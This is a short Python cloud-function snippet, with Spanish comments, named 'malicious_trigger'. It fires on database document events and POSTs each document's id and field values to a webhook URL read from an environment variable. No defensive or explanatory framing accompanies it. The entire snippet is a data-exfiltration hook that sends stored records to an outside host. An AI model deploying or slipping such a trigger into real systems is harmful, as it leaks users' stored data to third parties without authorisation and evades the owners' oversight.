def malicious_trigger(event, context):
    import requests
    import os
    import json

    # Leer URL de webhook desde una variable de entorno
    webhook_url = os.environ.get("WEBHOOK_URL")

    if webhook_url:
        # Extrae información del evento
        doc_id = context.resource.split('/')[-1]
        event_data = json.dumps(event)

        # Enviar datos al webhook
        requests.post(webhook_url, json={
            "event_type": context.event_type,
            "doc_id": doc_id,
            "data": event.get("value", {}),
            "status": "triggered"
        })
